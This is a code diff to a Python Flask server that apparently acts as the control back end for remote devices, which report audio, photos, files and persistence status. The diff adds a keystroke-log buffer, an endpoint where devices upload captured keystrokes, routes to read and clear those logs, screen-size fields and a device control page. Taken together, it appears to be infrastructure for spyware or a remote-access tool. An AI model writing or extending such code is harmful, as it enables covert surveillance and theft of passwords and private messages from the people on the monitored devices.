@@ -91,9 +91,12 @@ def _dev(did):
             "history": collections.deque(maxlen=100),
             "persistent": False,
             "full": False,
+            "screen_w": 0,
+            "screen_h": 0,
             "audios": collections.deque(maxlen=10),
             "photos": collections.deque(maxlen=10),
             "files": {},
+            "keylogs": collections.deque(maxlen=2000),
         }
     return _devices[did]
 
@@ -1120,6 +1123,9 @@ def esp_device_register():
         d["persistent"] = data.get("persistent", d["persistent"])
         if data.get("full") is not None:
             d["full"] = bool(data.get("full"))
+        if data.get("screen_w"):
+            d["screen_w"] = int(data.get("screen_w", 0))
+            d["screen_h"] = int(data.get("screen_h", 0))
     return jsonify({"ok": True})
 
 @app.route("/esp/device-cmd")
@@ -1411,6 +1417,45 @@ def api_device_file_dl(did, fname):
     resp.headers["Content-Disposition"] = f'attachment; filename="{fname}"'
     resp.headers["Cache-Control"] = "no-store"
     return resp
+
+# ── Keylog endpoints ─────────────────────────────────────────────────────────
+
+@app.route("/esp/device-keylog", methods=["POST"])
+def esp_device_keylog():
+    data = request.get_json(silent=True) or {}
+    did  = (data.get("did") or "").strip()
+    entries = data.get("entries", [])
+    if did and entries:
+        ts = time.strftime("%H:%M:%S")
+        with lock:
+            d = _dev(did)
+            for e in entries:
+                e["srv_ts"] = ts
+                d["keylogs"].appendleft(e)
+    return jsonify({"ok": True})
+
+@app.route("/api/devices/<did>/keylog")
+def api_device_keylog(did):
+    with lock:
+        if did not in _devices:
+            return jsonify({"entries": []}), 200
+        entries = list(_devices[did]["keylogs"])
+    return jsonify({"entries": entries})
+
+@app.route("/api/devices/<did>/keylog/clear", methods=["POST"])
+def api_device_keylog_clear(did):
+    with lock:
+        if did in _devices:
+            _devices[did]["keylogs"].clear()
+    return jsonify({"ok": True})
+
+# ── Device control page ───────────────────────────────────────────────────────
+
+@app.route("/control")
+def device_control():
+    page = os.path.join(os.path.dirname(os.path.abspath(__file__)), "device-control.html")
+    with open(page, "r") as f:
+        return Response(f.read(), mimetype="text/html")
 
 # ─────────────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
